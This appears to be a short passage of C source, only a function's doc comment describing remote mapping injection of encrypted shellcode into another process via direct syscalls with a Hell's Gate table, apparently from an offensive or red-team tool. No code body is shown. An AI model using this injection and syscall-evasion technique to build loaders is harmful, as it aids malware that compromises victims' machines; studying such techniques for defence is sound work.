...
/*
 * Remote mapping injection via direct syscalls
 * Performs payload decryption before creating the thread
 *
 * @param pVxTable: Hell's Gate table for direct syscalls
 * @param hProcess: Handle to the process to inject into
 * @param pShellcode: Encrypted shellcode to inject
 * @param sSize: Size of the encrypted shellcode
 *
 * @returns: TRUE/FALSE if the injection succeeded/failed
 */
